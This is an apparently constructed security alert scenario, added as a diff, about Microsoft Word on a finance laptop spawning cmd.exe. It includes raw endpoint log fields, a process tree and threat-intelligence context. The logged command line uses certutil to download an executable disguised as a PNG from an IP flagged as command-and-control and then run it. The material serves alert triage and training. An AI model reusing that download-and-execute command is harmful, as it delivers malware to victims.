@@ -1,0 +1,62 @@
+1. Alert Metadata
+
+    Alert Name: Suspicious Process Spawned by Microsoft Office Application
+
+    Severity: High
+
+    Timestamp: 2026-07-13T18:14:22.104Z
+
+    Sensor/Tool Source: Microsoft Defender for Endpoint (MDE)
+
+2. The Raw Log Data
+Timestamp: "2026-07-13T18:14:21.897Z"
+EventID: "DeviceProcessEvents"
+DeviceName: "FIN-LAPTOP-084"
+DeviceId: "9d3e4b7a-1122-4c33-bd88-0123456789ab"
+InitiatingProcessAccountName: "a.vance"
+InitiatingProcessAccountDomain: "CONTOSO"
+InitiatingProcessFolderPath: "C:\\Program Files\\Microsoft Office\\root\\Office16"
+InitiatingProcessFileName: "winword.exe"
+InitiatingProcessCommandLine: "\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\a.vance\\Downloads\\Invoice_77391.docx\""
+InitiatingProcessId: 6148
+InitiatingProcessParentFileName: "explorer.exe"
+FileName: "cmd.exe"
+FolderPath: "C:\\Windows\\System32"
+CommandLine: "cmd.exe /c certutil.exe -urlcache -split -f http://193.233.140.9/assets/logo.png C:\\Users\\Public\\Update.exe && C:\\Users\\Public\\Update.exe"
+ProcessId: 9024
+MD5: "F3B0C44298FC1C149AFBF4C8996FB924"
+SHA256: "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"
+
+3. Artifact Panel Context
+
+    Process Lineage Tree:
+
+        explorer.exe (PID: 2840)
+
+            winword.exe (PID: 6148)
+
+                cmd.exe (PID: 9024)
+
+                    certutil.exe (PID: 9028)
+
+                    Update.exe (PID: 9112)
+
+    Network & Threat Intelligence Context:
+
+        Target URL: http://193.233.140.9/assets/logo.png
+
+        Destination IP: 193.233.140.9
+
+        ASN: AS48282 (Hostkey B.V.)
+
+        Reputational Data: IP flagged in emerging threat feeds within the last 48 hours as a known Command and Control (C2) node.
+
+        HTTP Response Headers: Content-Type header returned by the remote server is application/x-msdownload, despite the .png extension in the URL request path.
+
+    User Context & Asset Activity:
+
+        User: a.vance (Role: Accounts Payable Specialist)
+
+        Asset Tags: Finance-Dept, Sensitive-Data-Access
+
+        Host Execution History: Baseline analysis indicates no prior history of Microsoft Office applications spawning command-line interpreters or administrative utilities (certutil.exe, powershell.exe) on this endpoint within the past 180 days.
